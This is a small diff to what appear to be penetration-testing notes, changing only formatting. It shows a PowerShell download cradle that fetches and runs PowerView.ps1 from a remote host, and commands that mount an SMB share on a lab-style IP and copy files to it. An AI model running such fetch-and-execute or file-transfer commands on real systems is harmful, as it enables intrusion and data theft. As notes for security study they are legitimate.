@@ -59,7 +59,7 @@ $cred = new-object system.management.automation.pscredential('guest', $pass)
 new-psdrive -name kalidrive -psprovider filesystem -credential $cred -root \\10.10.14.77\kalishare
 ```
 
- X:\" "&gt;
+X:\" "&gt;
 
 ```text
 net use x: \\10.10.14.77\kalishare /user:guest guest
@@ -68,7 +68,7 @@ cmd /c "copy  X:\"
 
 ## Powerview
 
-IEX\(new-object net.webclient\).downloadstring\('http://$IP/PowerView.ps1'\) =&gt; this directly import powerview into source
+IEX\(new-object net.webclient\).downloadstring\('[http://$IP/PowerView.ps1'\](http://$IP/PowerView.ps1'\)\) =&gt; this directly import powerview into source
 
 ## LDAPSEARCH
 
